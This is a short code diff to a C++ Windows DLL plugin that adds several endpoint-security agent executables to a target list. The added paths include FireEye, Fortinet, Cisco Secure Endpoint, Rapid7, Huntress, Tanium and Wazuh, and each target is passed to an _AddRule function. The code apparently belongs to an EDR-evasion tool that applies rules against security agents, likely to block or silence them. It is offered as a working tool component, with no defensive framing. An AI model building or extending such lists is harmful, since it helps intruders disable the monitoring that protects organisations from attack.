@@ -79,6 +79,22 @@ extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
         L"%ProgramFiles%\\Cybereason ActiveProbe\\AmSvc.exe",
         // Check Point Harmony Endpoint
         L"%ProgramFiles%\\CheckPoint\\Endpoint Security\\EFR\\EFRService.exe",
+        // FireEye / Mandiant Endpoint Security
+        L"%ProgramFiles%\\FireEye\\FireEye Endpoint Agent\\xagt.exe",
+        // Fortinet FortiClient / FortiEDR
+        L"%ProgramFiles%\\Fortinet\\FortiClient\\FortiClient.exe",
+        L"%ProgramFiles%\\Fortinet\\FortiEDR\\FortiEDRCollector.exe",
+        // Cisco Secure Endpoint (formerly AMP for Endpoints)
+        L"%ProgramFiles%\\Cisco\\AMP\\sfc.exe",
+        // Rapid7 Insight Agent
+        L"%ProgramFiles%\\Rapid7\\Insight Agent\\ir_agent.exe",
+        // Huntress Agent
+        L"%ProgramFiles%\\Huntress\\HuntressAgent.exe",
+        // Tanium Client
+        L"%ProgramFiles%\\Tanium\\Tanium Client\\TaniumClient.exe",
+        // Wazuh Agent
+        L"%ProgramFiles%\\ossec-agent\\ossec-agent.exe",
+        L"%ProgramFiles%\\Wazuh Agent\\wazuh-agent.exe",
     };
     DWORD n=sizeof(targets)/sizeof(targets[0]);
     for(DWORD i=0;i<n;i++)_AddRule(sys,targets[i],(int)i);
